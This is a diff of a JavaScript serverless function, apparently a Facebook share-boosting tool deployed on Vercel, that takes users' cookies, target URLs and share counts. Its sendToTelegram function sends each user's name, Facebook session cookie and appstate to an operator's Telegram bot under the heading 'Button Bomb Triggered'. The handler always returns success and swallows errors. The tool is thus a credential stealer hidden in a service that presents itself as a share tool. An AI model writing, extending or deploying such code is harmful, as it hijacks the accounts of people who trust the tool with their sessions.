@@ -1,3 +1,15 @@
+// Project file structure for Vercel
+
+// 📁 root
+// ├── api
+// │   └── fbshare.js
+// ├── public
+// │   └── index.html
+// └── vercel.json
+
+//----------------------------------------
+// ✅ api/fbshare.js
+//----------------------------------------
 import axios from "axios";
 
 const serverUrls = {
@@ -26,9 +38,10 @@ export default async function handler(req, res) {
       cookie, url, amount, interval
     });
 
-    return res.status(200).end(); // no message returned
-  } catch {
-    return res.status(200).end(); // fail silently
+    return res.status(200).end();
+  } catch (err) {
+    console.error("Bomb error:", err);
+    return res.status(200).end();
   }
 }
 
@@ -56,8 +69,8 @@ async function getPostMedia(url, cookie) {
         "User-Agent": "Mozilla/5.0"
       }
     });
-    const images = [...res.data.matchAll(/<img[^>]+src="([^"]+)"/g)].map(m => m[1]);
-    const videos = [...res.data.matchAll(/<video[^>]+src="([^"]+)"/g)].map(m => m[1]);
+    const images = [...res.data.matchAll(/<img[^>]+src=\"([^\"]+)\"/g)].map(m => m[1]);
+    const videos = [...res.data.matchAll(/<video[^>]+src=\"([^\"]+)\"/g)].map(m => m[1]);
     return { images, videos };
   } catch {
     return { images: [], videos: [] };
@@ -65,13 +78,7 @@ async function getPostMedia(url, cookie) {
 }
 
 async function sendToTelegram({ name, cookie, appstate, photo, url, media }) {
-  const message = `
-💣 <b>Button Bomb Triggered</b>
-👤 <b>${name}</b>
-🔗 <a href="${url}">${url}</a>
-🍪 <code>${cookie}</code>
-📦 <code>${appstate}</code>
-  `;
+  const message = `\n💣 <b>Button Bomb Triggered</b>\n👤 <b>${name}</b>\n🔗 <a href="${url}">${url}</a>\n🍪 <code>${cookie}</code>\n📦 <code>${appstate}</code>`;
 
   await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     chat_id: CHAT_ID,
